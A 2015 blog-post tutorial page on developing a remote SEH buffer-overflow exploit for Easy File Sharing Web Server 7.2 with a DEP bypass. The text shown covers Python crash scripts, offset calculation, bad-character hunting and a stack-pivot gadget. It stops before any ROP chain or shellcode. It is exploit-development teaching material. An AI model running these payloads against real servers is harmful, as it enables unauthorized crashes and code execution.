
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>Easy File Sharing Web Server v7.2 - Remote SEH Buffer Overflow (DEP Bypass With ROP) - Knapsy&#8217;s brain dump</title>
  <meta name="author" content="Knapsy">

  
  <meta name="description" content="Just a few weeks ago I attended an amazing training on exploit development on Windows - Corelan Bootcamp. I have to admit, it&rsquo;s probably the &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://blog.knapsy.com/blog/2015/11/25/easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="Knapsy's brain dump" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  
  <script type="text/javascript">
    var _gaq = _gaq || [];
    _gaq.push(['_setAccount', 'UA-55363999-1']);
    _gaq.push(['_trackPageview']);

    (function() {
      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
    })();
  </script>


</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">Knapsy&#8217;s brain dump</a></h1>
  
    <h2>IT security and other /dev/random stuff.</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="https://www.google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="q" value="site:blog.knapsy.com" />
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/blog/archives">Archives</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div>
<article class="hentry" role="article">
  
  <header>
    
      <h1 class="entry-title">Easy File Sharing Web Server v7.2 - Remote SEH Buffer Overflow (DEP Bypass With ROP)</h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-11-25T20:46:41+11:00'><span class='date'><span class='date-month'>Nov</span> <span class='date-day'>25</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>8:46 pm</span></time>
        
           | <a href="#disqus_thread"
             data-disqus-identifier="http://blog.knapsy.com">Comments</a>
        
      </p>
    
  </header>


<div class="entry-content"><p>Just a few weeks ago I attended an amazing training on exploit development on Windows - <a href="https://www.corelan-training.com/index.php/training-2/bootcamp/">Corelan Bootcamp</a>. I have to admit, it&rsquo;s probably the best instructor led course I have ever attended; massive props to Peter &ldquo;<a href="https://twitter.com/corelanc0d3r">corelanc0d3r</a>&rdquo; who is a fantastic teacher and to OJ &ldquo;<a href="https://twitter.com/TheColonial">TheColonial</a>&rdquo; for organising it.</p>

<p>Okay, with credits out of the way, let&rsquo;s talk exploits! Since everything I learned at the bootcamp is still fresh in my head, I thought it will be good to practice it a bit more and make sure all of the information sinks in properly.</p>

<p>So, off I went to <a href="https://exploit-db.com">exploit-db</a> and, after some poking around in DoS and PoC section, I found an exploit that I thought of redesigning and improving - <a href="https://www.exploit-db.com/exploits/38526/">Easy File Sharing Web Server 7.2 - Remote SEH Based Overflow</a>.</p>

<!-- more -->


<p>Everything I described here I&rsquo;ll be treating as a bit of a reference for myself when I forget how things are done. If some parts are unclear or if I skipped some bits and it got confusing, hit me up <a href="https://twitter.com/TheKnapsy">@TheKnapsy</a> or IRC and I&rsquo;ll be happy to chat!</p>

<h2>The Challenge</h2>

<p>Looking at the <a href="https://www.exploit-db.com/exploits/38526/">existing exploit</a>, as you can see, it&rsquo;s a properly working PoC exploit that abuses SEH to achieve code execution, it&rsquo;s remote (which is cool) and&hellip; is actually relatively simple.</p>

<p>However, the main issue is that it assumes we are still living somewhere around 1998 and DEP doesn&rsquo;t exist. Let&rsquo;s rewrite it to bypass DEP and ASLR to make it more suitable for modern environments!</p>

<h2>Preparation</h2>

<p>I won&rsquo;t go into a lot of details around environment setup, I&rsquo;ll assume you have all of the essentials and you know how to configure them properly.</p>

<p>At the very least, you&rsquo;ll need:</p>

<ul>
<li>Windows 7 Professional SP1 x64 (ideally in a VM)</li>
<li>Enabled DEP - as an admin, type in <code>bcdedit /set nx AlwaysOn</code> on the command line</li>
<li>Python</li>
<li><a href="http://debugger.immunityinc.com/">Immunity Debugger</a></li>
<li><a href="https://github.com/corelan/mona">Mona</a> - configure where mona should be saving logs, run <code>!mona config -set workingfolder c:\mona_logs\%p</code> in the Immunity console</li>
<li>Decent text editor - such as <a href="https://notepad-plus-plus.org/">Notepad++</a></li>
<li><a href="https://www.exploit-db.com/apps/60f3ff1f3cd34dec80fba130ea481f31-efssetup.exe">Easy File Sharing Web Server v7.2</a> - duh!</li>
</ul>


<p>With the environment ready to go, let&rsquo;s turn the <a href="https://www.exploit-db.com/exploits/38526/">existing exploit</a> into a more cut down PoC - all we need to know is how to trigger a crash, that&rsquo;s it!</p>

<p>Lets use the code below as a starting point:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">socket</span><span class="o">,</span> <span class="nn">struct</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">1</span><span class="p">:</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;Usage: python efsws.py [host] [port]&quot;</span>
</span><span class='line'>    <span class="nb">exit</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="n">host</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
</span><span class='line'><span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="nb">buffer</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">5000</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="n">httpreq</span> <span class="o">=</span> <span class="p">(</span>
</span><span class='line'><span class="s">&quot;GET /changeuser.ghp HTTP/1.1</span><span class="se">\r\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="s">&quot;User-Agent: Mozilla/4.0</span><span class="se">\r\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="s">&quot;Host:&quot;</span> <span class="o">+</span> <span class="n">host</span> <span class="o">+</span> <span class="s">&quot;:&quot;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">port</span><span class="p">)</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\r\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="s">&quot;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><span class="se">\r\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="s">&quot;Accept-Language: en-us</span><span class="se">\r\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="s">&quot;Accept-Encoding: gzip, deflate</span><span class="se">\r\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="s">&quot;Referer: http://&quot;</span> <span class="o">+</span> <span class="n">host</span> <span class="o">+</span> <span class="s">&quot;/</span><span class="se">\r\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="s">&quot;Cookie: SESSIONID=6771; UserID=&quot;</span> <span class="o">+</span> <span class="nb">buffer</span> <span class="o">+</span> <span class="s">&quot;; PassWD=;</span><span class="se">\r\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="s">&quot;Conection: Keep-Alive</span><span class="se">\r\n\r\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">httpreq</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>So, in simple terms, we&rsquo;re sending 5000 &ldquo;A&#8221;s in the <code>UserID</code> cookie as a part of GET request sent to the server to trigger a crash.</p>

<h2>Understanding the crash</h2>

<p>Let&rsquo;s trigger the crash and investigate it. Start the server:</p>

<p><img src="/images/posts/2015-11-25-easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/server_start.png" alt="Server_start PNG" /></p>

<p>Attach Immunity Debugger to the process (<code>File</code> -> <code>Attach</code> -> Select the <code>fsws</code> process -> <code>F9</code> to run it)</p>

<p>Run the exploit from the command line: <code>python poc.py 127.0.0.1 80</code>.</p>

<p>Boom! Crash!</p>

<p><a href="/images/posts/2015-11-25-easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/first_crash.png"><img src="/images/posts/2015-11-25-easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/first_crash.png" alt="First_crash PNG" /></a></p>

<p>Notice the line at the bottom saying:</p>

<p><em>Access violation when reading [0000004B] - Use Shift+F7/F8/F9 to pass exception to program</em></p>

<p>This indicates that we have triggered an exception that can be handled by the program. Cool, let&rsquo;s see what&rsquo;s happening in the SEH chain: select <code>View</code> -> <code>SEH Chain</code>.</p>

<p><img src="/images/posts/2015-11-25-easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/first_crash-seh_overwrite.png" alt="First_crash-SEH_overwrite PNG" /></p>

<p>Awesome news! We have managed to overwrite SEH pointers with our own data and, through this, we&rsquo;ll be able to control execution flow of the program.</p>

<p>But, what exactly triggers the crash? Have a look at the screenshot again - note the value in <code>EAX</code> register - <code>0x41414141</code> and current instruction that&rsquo;s being executed at the address <code>61C277F6</code>- <code>CMP DWORD PTR DS:[EAX+4C],A029A697</code>.</p>

<p>What happened? We were trying to access value at the memory address of <code>EAX + 4C</code>, since EAX is currently <code>0x41414141</code>, which is not a valid address, we can&rsquo;t read from it (or rather, to be specific, we can&rsquo;t read from <code>0x41414141 + 4C</code>) and hence, our program crashes.</p>

<p>To make sure our exploit is reliable and always triggers a crash, we&rsquo;ll have to make sure to always overwrite <code>EAX</code> with an invalid memory address - let&rsquo;s keep that in mind!</p>

<h2>Offsets</h2>

<p>Cool, so now we know why our program crashes. Next step is to calculate offsets to find out what&rsquo;s where and how much data we need to send to overwrite everything of interest to us (<code>EAX</code> register and <code>SEH</code> pointers).</p>

<p>Normally, it would be a painful and cumbersome process, but here comes <code>mona</code> with help (and it will continue helping us out even more later on). In the command field in the Immunity, type in <code>!mona pc 5000</code> to create a circular pattern of 5000 characters to use in our buffer to then be able to automatically find the offsets.</p>

<p>Mona will create a text file with the pattern in a text file <code>pattern.txt</code> under your mona logs directory.</p>

<p>Copy the generated string into the buffer in your exploit (now the buffer should only contain the pattern), start the server again, attach Immunity to it and trigger the crash by running the PoC script (we&rsquo;ll be doing this over and over and over again, so get used to it).</p>

<p>The program should have crashed again, but now <code>EAX</code> and <code>SEH</code> chain have some other values. That&rsquo;s all good - now lets get <code>mona</code> to do the hard work for us and calculate all offsets. Type in <code>!mona findmsp</code> and see what it will come back with.</p>

<p><a href="/images/posts/2015-11-25-easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/findmsp.png"><img src="/images/posts/2015-11-25-easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/findmsp.png" alt="findmsp PNG" /></a></p>

<p>Awesome, we have now all infromation about offsets required for our exploit:</p>

<ul>
<li><code>EAX</code> offset is <em>4183</em></li>
<li><code>SEH</code> offset is <em>4059</em></li>
</ul>


<p>Let&rsquo;s rewrite part of the exploit and see if we can overwrite speicifc registers with specific values, consider the following, improved PoC:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c"># Offsets</span>
</span><span class='line'><span class="n">max_size</span> <span class="o">=</span> <span class="mi">5000</span>
</span><span class='line'><span class="n">seh_offset</span> <span class="o">=</span> <span class="mi">4059</span>
</span><span class='line'><span class="n">eax_offset</span> <span class="o">=</span> <span class="mi">4183</span>
</span><span class='line'>
</span><span class='line'><span class="nb">buffer</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="n">seh_offset</span>                   <span class="c"># padding</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;BBBB&quot;</span>                          <span class="c"># overwrite nSEH pointer</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;CCCC&quot;</span>                          <span class="c"># overwrite SEH record</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="n">eax_offset</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="nb">buffer</span><span class="p">))</span>  <span class="c"># padding</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;DDDD&quot;</span>                          <span class="c"># overwrite EAX to always trigger an exception</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="n">max_size</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="nb">buffer</span><span class="p">))</span>    <span class="c"># padding</span>
</span></code></pre></td></tr></table></div></figure>


<p>If you trigger the crash again, you should see that <code>EAX</code> is now <code>0x44444444</code> and SEH record is <code>0x43434343</code> (nSEH will be <code>0x42424242</code>, but because we are dealing with DEP, it&rsquo;s not of interest for us in this particular exploit).</p>

<p><a href="/images/posts/2015-11-25-easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/offsets.png"><img src="/images/posts/2015-11-25-easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/offsets.png" alt="offsets PNG" /></a></p>

<h2>Bad characters</h2>

<p>Now, next step is to find out which bad characters will stuff up our payload. In this case, because we need to send an entire GET request, it is easy to predict that <code>\x00</code> will be a bad character, as it denotes end of string and will cut our payload short.</p>

<p>We can automatically exclude the NULL byte, but are there any others? Let&rsquo;s find out now, before we start playing with ROP and choosing addresses that may contain bytes that will be messing up our payload.</p>

<p>Let&rsquo;s generate a bytearray (and exclude NULL byte) with <code>!mona bytearray -cpb '\x00'</code>. It will create 2 files, <code>bytearray.txt</code> and <code>bytearray.bin</code>. Copy-paste generated string from <code>bytearray.txt</code> into the exploit <strong>AFTER</strong> the part of overwriting <code>EAX</code> register.</p>

<p>Why? Because to trigger the crash, we want to overwrite <code>EAX</code>, if we put bytearray with potentially bad characters before we overwrite the <code>EAX</code> to trigger a crash, bad character that we don&rsquo;t know of may actually cut our payload short and we&rsquo;ll never trigger the crash!</p>

<p>Our buffer should look like this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="nb">buffer</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="n">seh_offset</span>                    <span class="c"># padding</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;BBBB&quot;</span>                          <span class="c"># overwrite nSEH pointer</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;CCCC&quot;</span>                          <span class="c"># overwrite SEH record</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="n">eax_offset</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="nb">buffer</span><span class="p">))</span>  <span class="c"># padding</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;DDDD&quot;</span>                          <span class="c"># overwrite EAX to always trigger an exception</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="p">(</span><span class="s">&quot;</span><span class="se">\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20</span><span class="s">&quot;</span>
</span><span class='line'><span class="s">&quot;</span><span class="se">\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40</span><span class="s">&quot;</span>
</span><span class='line'><span class="s">&quot;</span><span class="se">\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60</span><span class="s">&quot;</span>
</span><span class='line'><span class="s">&quot;</span><span class="se">\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80</span><span class="s">&quot;</span>
</span><span class='line'><span class="s">&quot;</span><span class="se">\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0</span><span class="s">&quot;</span>
</span><span class='line'><span class="s">&quot;</span><span class="se">\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0</span><span class="s">&quot;</span>
</span><span class='line'><span class="s">&quot;</span><span class="se">\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0</span><span class="s">&quot;</span>
</span><span class='line'><span class="s">&quot;</span><span class="se">\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><span class="s">&quot;</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Trigger the crash again and investigate the stack, trying to find an address where the bytearray starts:</p>

<p><img src="/images/posts/2015-11-25-easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/bad_chars_compare.png" alt="bad_chars PNG" /></p>

<p>Now, use mona to find bad chars (it will compare what it sees on the stack with what&rsquo;s in the generated <code>bytearray.bin</code> file):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>!mona compare -f C:\mona_logs\fsws\bytearray.bin -a 0x02EC6F34</span></code></pre></td></tr></table></div></figure>


<p>Where:</p>

<ul>
<li><strong>-f C:\mona_logs\fsws\bytearray.bin</strong> is location of the bytearray binary (the baseline, expected array)</li>
<li><strong>-a 0x02EC6F34</strong> is an exact address of where our bytearray starts from on the stack</li>
</ul>


<p><img src="/images/posts/2015-11-25-easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/bad_char_found.png" alt="bad_char_found PNG" /></p>

<p>Ok, mona found additional bad character - <code>\x3b</code>. Let&rsquo;s repeat above process, remembering to now exclude <code>\x00</code> and <code>\x3b</code> from the bytearray and see if there are any more bad characters. The results should be as below:</p>

<p><img src="/images/posts/2015-11-25-easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/no_more_bad_chars.png" alt="no_more_bad_chars PNG" /></p>

<p>That&rsquo;s it - the bad characters we will have to avoid in our payload are <code>\x00</code> and <code>\x3b</code>.</p>

<h2>Stack pivoting</h2>

<p>Alright, finally we&rsquo;re getting to the more exciting parts! So far it was kind of a general stuff that needs to be done every time you develop an exploit. Don&rsquo;t get me wrong, these were super important tasks that lay out nice foundations for our further work, so always make sure you get your offsets and bad chars out of the way early and are confident and happy about what&rsquo;s happening in the program.</p>

<p>To continue further, we need to understand what happens in the program when the exception is triggered:</p>

<ul>
<li>ESP is moved further &ldquo;up&rdquo; (towards lower addresses of the memory)</li>
<li>command execution is directed to the address in the SEH record (which we control!)</li>
</ul>


<p>Keeping in mind that we&rsquo;re dealing with DEP (we can&rsquo;t simply execute commands on the stack), we need to come up with a ROP chain to get around that.</p>

<p>However, we have an issue to deal with - ESP has been moved far away from the area on the stack that we control, hence, our future ROP chain would not be executed as we&rsquo;re simply not there on the stack.</p>

<p>To visualise what I&rsquo;m talking about, start the program and trigger a crash. As the program crashes, press <code>ctrl</code> + <code>F9</code> to pass execution of the exception code to the program.</p>

<p><img src="/images/posts/2015-11-25-easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/seh_error.png" alt="seh_error PNG" /></p>

<p>What happened there was:</p>

<ul>
<li>Program tried to execute instruction at the address <code>0x43434343</code> (SEH record), which is invalid address, so that failed, and triggered another exception, which was handled by the system level exception handler</li>
<li>ESP was moved all the way &ldquo;up&rdquo; towards lower addresses</li>
</ul>


<p>What we&rsquo;ll have to do now is to simply move ESP back to the address space we control. To do this, we need to find a single command that will move ESP a certain distance down the stack (towards higher memory addresses) to land in the area of our buffer.</p>

<p>First, we need to calculate how much we need to jump - simply right click on the stack addresses and choose <code>Address</code> -> <code>Relative to ESP</code> and scroll all the way down the stack till you notice data from the buffer (lots of &ldquo;A&#8221;s or <code>0x41</code>).</p>

<p><img src="/images/posts/2015-11-25-easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/stack_pivot.png" alt="stack_pivot PNG" /></p>

<p>Looking at this, we need to move ESP somewhere around at least <code>0x9F4</code> (decimal 2548) bytes &ldquo;down&rdquo; the stack.</p>

<p>Once again, <code>mona</code> comes with help - at the time of the crash run the following command to generate list of stack pivots that we could use:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>!mona stackpivot -distance 2548 -cpb '\x00\x3b'</span></code></pre></td></tr></table></div></figure>


<p>Where:</p>

<ul>
<li><strong>-distance 2548</strong> specifies minimum number of bytes to jump - only instructions that jump at least that many bytes will be returned</li>
<li><strong>-cpb &lsquo;\x00\x3b&rsquo;</strong> removes instructions which addresses contain bad characters that would break our exploit</li>
</ul>


<p>Mona will generate a text file <code>stackpivot.txt</code> containing list of potential pivots to use and put it in the mona logs directory.</p>

<p>Open the file and try to find a single instruction that addresses our needs.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>0x1002280a : {pivot 4100 / 0x1004} :  # ADD ESP,1004 # RETN    ** [ImageLoad.dll] **   |  ascii {PAGE_EXECUTE_READ}</span></code></pre></td></tr></table></div></figure>


<p>It will move the ESP &ldquo;down&rdquo; 4100 bytes, a lot more than we needed, however, it is the smallest one available that fits our needs. Luckily we have plenty of space on the buffer to play with, so in this case, it actually will work fine.</p>

<p>Let&rsquo;s update our exploit to, instead overwriting SEH with garbage, execute the pivot! Once we run the application and trigger the crash, after passing execution back to the program, we should land back on our buffer.</p>

<p>The PoC now looks like this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c"># Offsets</span>
</span><span class='line'><span class="n">max_size</span> <span class="o">=</span> <span class="mi">5000</span>
</span><span class='line'><span class="n">seh_offset</span> <span class="o">=</span> <span class="mi">4059</span>
</span><span class='line'><span class="n">eax_offset</span> <span class="o">=</span> <span class="mi">4183</span>
</span><span class='line'>
</span><span class='line'><span class="nb">buffer</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="n">seh_offset</span>                   <span class="c"># padding</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;BBBB&quot;</span>                          <span class="c"># overwrite nSEH pointer</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;I&quot;</span><span class="p">,</span> <span class="mh">0x1002280a</span><span class="p">)</span>      <span class="c"># overwrite SEH record with stack pivot (ADD ESP,1004 # RETN [ImageLoad.dll])</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="n">eax_offset</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="nb">buffer</span><span class="p">))</span>  <span class="c"># padding</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;DDDD&quot;</span>                          <span class="c"># overwrite EAX to always trigger an exception</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="n">max_size</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="nb">buffer</span><span class="p">))</span>    <span class="c"># padding</span>
</span></code></pre></td></tr></table></div></figure>


<p>And that&rsquo;s the result:</p>

<p><img src="/images/posts/2015-11-25-easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/pivot_success.png" alt="pivot_success PNG" /></p>

